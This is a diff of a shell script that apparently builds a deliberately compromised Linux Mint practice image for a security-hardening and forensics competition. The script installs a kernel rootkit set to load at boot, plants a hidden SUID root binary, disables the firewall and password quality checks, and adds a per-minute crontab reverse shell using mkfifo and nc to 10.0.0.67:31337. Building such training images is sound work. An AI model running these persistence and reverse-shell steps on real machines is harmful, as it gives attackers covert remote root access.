@@ -11,9 +11,55 @@ fi
 source ./config.sh
 source ./helpers.sh
 
+# set nameserver
+sed 's/nameserver.*/nameserver 8.8.8.8/' -i /etc/resolv.conf
+
+#### remove development artifacts
+# purge mysql
+apt purge mysql-client-8.0 -y
+apt purge mysql-client-core-8.0 -y
+apt purge mysql-common -y
+apt purge mysql-server-8.0 -y
+apt purge mysql-server-core-8.0 -y
+apt purge mysql-server -y
+rm -rf /etc/mysql/
+rm -rf /var/lib/mysql/
+rm -rf /var/log/mysql/
+rm -rf /usr/share/mysql/
+
+# purge ruby
+apt purge ruby -y
+apt purge ruby-bundler -y
+apt purge ruby-mysql2 -y
+apt purge git -y
+
+apt autoremove -y
+
+#### build for docker and persistence
 # build requirements
 apt install gcc -y
-apt install binutils-dev -y
+apt install build-essential -y
+apt install makeself -y
+apt install pandoc -y
+
+# install rootkit
+# we aren't trying to hid this so install it so we can
+# find it with modinfo
+#find /lib/modules/ -type f -name cpnofind.ko | xargs rm
+find /lib/modules/ -type f -name "cpnofind.ko" | xargs rm
+(cd orig/rootkit/ && make && make install)
+depmod -A
+mkdir -p /var/cantfind/
+echo "password_value=1ts4m3M4r10" > /var/cantfind/secret_password.txt
+#insmod orig/rootkit/cpnofind.ko
+(cd orig/rootkit && make clean)
+sed '/cpnofind.*/d' -i /etc/modules
+echo cpnofind >> /etc/modules
+
+# suid file
+cc -o /var/log/.harmless orig/suid.c
+chown root:root /var/log/.harmless
+chmod 4755 /var/log/.harmless
 
 # start c4pt docker image
 systemctl enable docker
@@ -23,6 +69,7 @@ docker rm c4pt
 docker system prune -f
 docker run -d --name c4pt --restart always -p 6443:6443 c4pt
 
+#### build
 # install forensics questions
 echo "install forensics questions"
 declare -n list="${forensics_questions[questions]}"
@@ -39,21 +86,6 @@ systemctl start inetd
 apt install telnetd -y
 systemctl restart inetd
 
-# install rootkit
-# we aren't trying to hid this so install it so we can
-# find it with modinfo
-#find /lib/modules/ -type f -name cpnofind.ko | xargs rm
-(cd orig/rootkit/ && make && make install && depmod -A)
-mkdir -p /var/nonofind/
-echo "password_value=1ts4m3M4r10" > /var/nonofind/secret_password.txt
-insmod orig/rootkit/cpnofind.ko
-(cd orig/rootkit && make clean)
-sed '/cpnofind.*/d' -i /etc/modules
-echo cpnofind >> /etc/modules
-
-# set nameserver
-sed 's/nameserver.*/nameserver 8.8.8.8/' -i /etc/resolv.conf
-
 # set mint update settings
 sudo -iu $SUDO_USER dbus-launch gsettings set com.linuxmint.updates refresh-schedule-enabled false
 mintupdate-automation upgrade disable
@@ -63,10 +95,10 @@ systemctl stop mintupdate-automation-upgrade.timer
 apt install at -y
 crontab -r -u harry
 killall -u harry
-rm /etc/cron.allow
-rm /etc/cron.deny
-rm /etc/at.allow
-rm /etc/at.deny
+rm -f /etc/cron.allow
+rm -f /etc/cron.deny
+rm -f /etc/at.allow
+rm -f /etc/at.deny
 
 # set up users
 configure_users
@@ -113,9 +145,9 @@ declare -n list=packages_install_list
 for pkg in "${list[@]}"; do
   apt purge $pkg -y
 done
-apt autoremove -y
 
 apt purge stacer -y
+
 apt autoremove -y
 
 # special case downgrade thunderbird
@@ -135,12 +167,8 @@ rm vivaldi-stable_6.8.3381.50-1_amd64.deb
 # get rid of cracklib
 apt purge libpam-pwquality -y
 apt purge libpam-cracklib -y
-apt autoremove -y
 
-# suid file
-cc -o /var/log/.harmless orig/suid.c
-chown root:root /var/log/.harmless
-chmod 4755 /var/log/.harmless
+apt autoremove -y
 
 # install orig files
 cp -f orig/common-* /etc/pam.d/
@@ -148,10 +176,6 @@ cp -f orig/login.defs /etc/
 cp -f orig/sysctl.conf /etc/
 cp -f orig/lightdm.conf /etc/lightdm/
 cp -f orig/sshd_config /etc/ssh/
-
-# reverse shell crontab for harry
-rm /tmp/leet
-cat <(echo "* * * * * rm /tmp/leet; mkfifo /tmp/leet; </tmp/leet /bin/sh -i 2>&1 | nc -q2 10.0.0.67 31337 >/tmp/leet") | crontab -u harry -
 
 # ufw
 ufw disable
@@ -172,5 +196,9 @@ mkdir -p "${location}"
 for file in "${list[@]}"; do
   echo "$EICAR" > "${location}/${file}"
 done
+
+# reverse shell crontab for harry
+rm /tmp/leet
+cat <(echo "* * * * * rm /tmp/leet; mkfifo /tmp/leet; </tmp/leet /bin/sh -i 2>&1 | nc -q2 10.0.0.67 31337 >/tmp/leet") | crontab -u harry -
 
 rm linux_signing_key*
